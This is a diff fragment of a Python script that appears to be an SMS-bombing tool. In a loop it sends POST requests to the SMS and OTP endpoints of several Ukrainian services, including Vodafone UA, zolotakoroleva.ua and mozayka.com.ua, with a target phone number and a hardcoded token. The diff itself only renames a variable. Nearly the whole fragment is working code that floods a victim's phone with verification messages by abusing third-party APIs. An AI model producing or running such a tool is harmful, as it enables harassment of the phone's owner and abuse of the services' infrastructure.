@@ -71,16 +71,16 @@ for _ in track(range(run)):
      print('Не доставлено "xtra.tv-pass"')
  try:
      print('Отправлено')
-     response = requests.post("https://registration.vodafone.ua/api/v1/process/smsCode", headers=headers, json={"number": number})
+     response = requests.post("https://registration.vodafone.ua/api/v1/process/smsCode", headers=headers, json={"number": NUMBER})
  except:
      print('Не Отправлено')
  try:
      print('Отправлено')
-     response = requests.post("https://zolotakoroleva.ua/api/send-otp",  headers=headers, json={"params": {"phone": "+" + number}})
+     response = requests.post("https://zolotakoroleva.ua/api/send-otp",  headers=headers, json={"params": {"phone": "+" + NUMBER}})
  except:
      print('Не Отправлено')
  try:
-     response = requests.post("https://mozayka.com.ua/!processing/ajax.php", headers=headers, data={"phone": "+" + number, "mp_m": "sendsmscodereg", "token": "9d064a2beeb932ae5de11f74631269b4"})
+     response = requests.post("https://mozayka.com.ua/!processing/ajax.php", headers=headers, data={"phone": "+" + NUMBER, "mp_m": "sendsmscodereg", "token": "9d064a2beeb932ae5de11f74631269b4"})
      print('Отправлено')
  except:
      print('Не Отправлено')
